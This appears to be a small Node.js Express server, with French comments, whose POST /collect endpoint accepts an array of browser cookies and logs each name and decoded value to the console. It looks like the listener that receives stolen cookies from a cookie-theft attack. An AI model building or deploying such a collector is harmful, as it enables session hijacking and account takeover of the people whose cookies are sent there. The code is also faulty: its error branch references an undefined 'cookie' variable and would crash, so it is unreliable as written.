const express = require('express');
const app = express();

app.use(express.json());

app.post("/collect", (req, res) => {
  const cookies = req.body.cookies;

  console.log("\n===== COOKIES REÇUS =====\n");

  if (!Array.isArray(cookies)) {
    console.log(`${cookie.name}:${decodeURIComponent(cookie.value)}`);
    return res.json({ status: "error" });
  }

  cookies.forEach(cookie => {
    // Correction ici : ajout des backticks ` autour de la chaîne
    console.log(`${cookie.name}:${decodeURIComponent(cookie.value)}`);
  });

  console.log("\n=========================\n");

  res.json({ status: "ok" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Serveur démarré sur le port ${PORT}`);
});
